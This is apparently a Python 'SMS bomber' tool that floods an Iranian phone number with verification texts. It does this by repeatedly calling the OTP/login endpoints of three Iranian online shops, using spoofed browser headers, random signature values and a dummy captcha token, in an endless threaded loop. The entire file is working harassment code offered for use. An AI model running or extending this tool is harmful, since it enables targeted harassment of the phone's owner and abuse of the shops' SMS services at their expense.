from platform import node, system, release
from os import system as os_system, name
from re import match, sub
from threading import Thread
import urllib3; urllib3.disable_warnings()
from time import sleep
import random
import socket

try:
    from requests import get, post
except ImportError:
    os_system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'
g = '\033[32;1m'
y = '\033[33;1m'
b = '\033[34;1m'
p = '\033[35;1m'
w = '\033[37;1m'
a = '\033[0m'
d = '\033[90;1m'

# System info
Node, System, Release = node(), system(), release()

# Clear screen
os_system('clear' if name == 'posix' else 'cls')

# Slow print
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Check internet
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# SMS services
# ------------------------------

def angeliran(phone):
    import requests
    
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
    
    try:
        url = "https://angeliran.com/wp-admin/admin-ajax.php"
        
        payload = {
            "digits_phone": formatted_phone,
            "login_digt_countrycode": "+98",
            "action_type": "phone",
            "digits_reg_name": "نام",
            "digits_process_register": "1",
            "digits": "1",
            "instance_id": "3ca4d54662e429573f577c799f4356b3",
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_redirect_page": "https://angeliran.com/my-account/",
            "digits_form": "23837de77d",
            "_wp_http_referer": "/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
            "show_force_title": "1"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://angeliran.com",
            "Referer": "https://angeliran.com/?login=true&redirect_to=https%3A%2F%2Fangeliran.com%2Fmy-account%2F&page=1",
        }
        
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                if response_data.get("success") is True:
                    print(f'{g}(angeliran) {a}Code Sent')
                    return True
                else:
                    print(f'{r}[-] (angeliran) API Error: {response_data}{a}')
                    return False
            except:
                if "1" in response.text or "success" in response.text.lower():
                    print(f'{g}(angeliran) {a}Code Sent')
                    return True
        
        print(f'{r}[-] (angeliran) HTTP Error: {response.status_code}{a}')
        return False
            
    except Exception as e:
        print(f'{r}[!] angeliran Exception: {e}{a}')
        return False


def mahabadperfume(phone):
    import requests
    import uuid
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://mahabadperfume.ir/backend/customer/v2/otp-send/s/"
    
    payload = {
        "phone_number": formatted_phone,
        "is_forget_password": False
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Customer-Signature": str(uuid.uuid4()),  # تولید UUID تصادفی
        "Origin": "https://mahabadperfume.ir",
        "Referer": "https://mahabadperfume.ir/",
        "accept-language": "fa-IR",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mahabadperfume) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mahabadperfume) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mahabadperfume Exception: {e}{a}')
        return False


def theshoes(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://theshoes.ir/api/v1/sessions/login_request"
    
    payload = {
        "mobile_phone": formatted_phone,
        "recaptcha_token": "dummy_token"  # توکن اصلی رو باید خودت بگیری
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://theshoes.ir",
        "Referer": "https://theshoes.ir/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f'{g}(theshoes) {a}Code Sent')
            return True
        print(f'{r}[-] (theshoes) HTTP Error: {response.status_code}{a}')
        return False
    except Exception as e:
        print(f'{r}[!] theshoes Exception: {e}{a}')
        return False
        

# ------------------------------
# Safe runner for services
# ------------------------------
def send_service_safe(service, phone):
    try:
        if service(phone):
            print(f"{g}[+] {service.__name__} sent successfully!{a}")
        else:
            print(f"{r}[-] {service.__name__} failed!{a}")
    except Exception as e:
        print(f"{r}[-] Error in {service.__name__}: {e}{a}")


# ------------------------------
# Simple SMS bomber
# ------------------------------
def Vip(phone, Time):
    services = [
        theshoes,
        mahabadperfume,
        angeliran,
         
    ]
    total_services = len(services)

    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)

    try:
        while True:
            for service in services:
                Thread(target=send_service_safe, args=(service, phone)).start()
                sleep(Time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Completed!")
        os_system('clear' if name == 'posix' else 'cls')


# Phone validation
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False


# Menu
def main_menu():
    os_system('clear' if name == 'posix' else 'cls')
    print_slow(f"""
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
{p}╚════════════════════════════════════════════════════╝
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    return input(f"{g}[?] {y}Enter Choice (0-2): {a}")


# Main loop
def main():
    while True:
        choice = main_menu()
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Email Bomber is not implemented in this snippet.")

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break

        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)


if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection detected!{a}")
    else:
        main()
